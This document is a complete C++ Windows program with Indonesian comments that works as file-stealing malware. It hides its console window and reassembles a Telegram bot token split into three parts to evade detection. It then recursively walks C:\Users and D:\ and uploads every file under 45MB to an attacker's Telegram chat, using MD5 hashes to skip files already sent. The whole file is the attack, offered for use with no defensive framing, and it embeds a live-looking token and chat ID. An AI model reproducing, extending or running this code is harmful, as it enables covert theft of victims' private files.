#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>
#include <windows.h>
#include <winhttp.h>
#include <bcrypt.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "bcrypt.lib")

namespace fs = std::filesystem;

// ================= KONFIGURASI =================
// TOKEN DIPECAH JADI 3 BAGIAN
const std::string TOKEN_PART_1 = "8283354389:AAFR0";
const std::string TOKEN_PART_2 = "ZXsnQ_7GhT_r_yHK";
const std::string TOKEN_PART_3 = "cd9aypqlLCcvJ0";

// Ganti dengan Chat ID Telegram lu yang baru (kalau beda)
const std::string CHAT_ID = "8275632263"; 

// Batas maksimal ukuran file (45MB)
const uintmax_t MAX_SIZE = 45 * 1024 * 1024; 
const std::string TRACK_FILE = "sent_hashes.txt";
// ===============================================

std::wstring BOT_TOKEN_W;

// ==========================================
// FUNGSI HASH MD5
// ==========================================
std::string GetMD5(const std::string& filepath) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    DWORD cbData = 0, cbHash = 0, cbHashObject = 0;
    PBYTE pbHashObject = NULL;
    PBYTE pbHash = NULL;
    std::string result = "";

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_MD5_ALGORITHM, NULL, 0) == 0) {
        BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbHashObject, sizeof(DWORD), &cbData, 0);
        BCryptGetProperty(hAlg, BCRYPT_HASH_LENGTH, (PBYTE)&cbHash, sizeof(DWORD), &cbData, 0);

        pbHashObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbHashObject);
        pbHash = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbHash);

        std::ifstream file(filepath, std::ios::binary);
        if (file.is_open()) {
            if (BCryptCreateHash(hAlg, &hHash, pbHashObject, cbHashObject, NULL, 0, 0) == 0) {
                char buffer[8192];
                while (file.read(buffer, sizeof(buffer)) || file.gcount() > 0) {
                    BCryptHashData(hHash, (PBYTE)buffer, file.gcount(), 0);
                }
                BCryptFinishHash(hHash, pbHash, cbHash, 0);

                char hex[33];
                for (int i = 0; i < (int)cbHash; i++) sprintf(hex + (i * 2), "%02x", pbHash[i]);
                result = std::string(hex);
                BCryptDestroyHash(hHash);
            }
            file.close();
        }
        if (pbHashObject) HeapFree(GetProcessHeap(), 0, pbHashObject);
        if (pbHash) HeapFree(GetProcessHeap(), 0, pbHash);
        BCryptCloseAlgorithmProvider(hAlg, 0);
    }
    return result;
}

// ==========================================
// FUNGSI UPLOAD FILE
// ==========================================
void UploadRawFile(const std::string& filepath) {
    std::wstring wFilepath(filepath.begin(), filepath.end());
    std::wstring filename = fs::path(filepath).filename().wstring();

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    
    std::wstring path = L"/bot" + BOT_TOKEN_W + L"/sendDocument";
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

    std::wstring boundary = L"----WebKitFormBoundary" + std::to_wstring(GetTickCount());
    std::wstring contentType = L"multipart/form-data; boundary=" + boundary;
    WinHttpAddRequestHeaders(hRequest, (L"Content-Type: " + contentType).c_str(), -1L, WINHTTP_ADDREQ_FLAG_ADD);

    std::string body = "";
    body += "--" + std::string(boundary.begin(), boundary.end()) + "\r\n";
    body += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + CHAT_ID + "\r\n";
    body += "--" + std::string(boundary.begin(), boundary.end()) + "\r\n";
    body += "Content-Disposition: form-data; name=\"document\"; filename=\"" + std::string(filename.begin(), filename.end()) + "\"\r\n";
    body += "Content-Type: application/octet-stream\r\n\r\n";

    std::ifstream file(filepath, std::ios::binary);
    std::string fileData((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();

    body += fileData + "\r\n";
    body += "--" + std::string(boundary.begin(), boundary.end()) + "--\r\n";

    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)body.c_str(), body.length(), body.length(), 0);
    WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

// ==========================================
// FUNGSI SEDOT FILE
// ==========================================
void StealFiles() {
    std::vector<std::string> sentHashes;
    
    std::ifstream track(TRACK_FILE);
    std::string line;
    while (std::getline(track, line)) sentHashes.push_back(line);
    track.close();

    std::ofstream trackAppend(TRACK_FILE, std::ios::app);

    std::vector<std::string> targets = { "C:\\Users", "D:\\" };

    for (const auto& target : targets) {
        if (!fs::exists(target)) continue;

        try {
            for (const auto& entry : fs::recursive_directory_iterator(target, fs::directory_options::skip_permission_denied)) {
                if (!entry.is_regular_file()) continue;
                
                uintmax_t size = entry.file_size();
                if (size == 0 || size > MAX_SIZE) continue;

                std::string pathStr = entry.path().string();
                std::string hash = GetMD5(pathStr);
                
                bool alreadySent = false;
                for (const auto& h : sentHashes) {
                    if (h == hash) { alreadySent = true; break; }
                }
                if (alreadySent) continue;

                UploadRawFile(pathStr);
                
                trackAppend << hash << "\n";
                sentHashes.push_back(hash);
            }
        } catch (...) {}
    }
    trackAppend.close();
}

// ==========================================
// MAIN
// ==========================================
int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE); 
    
    // Gabungin token dari 3 bagian
    std::string token_utuh = TOKEN_PART_1 + TOKEN_PART_2 + TOKEN_PART_3;
    BOT_TOKEN_W = std::wstring(token_utuh.begin(), token_utuh.end());

    StealFiles();
    return 0;
}
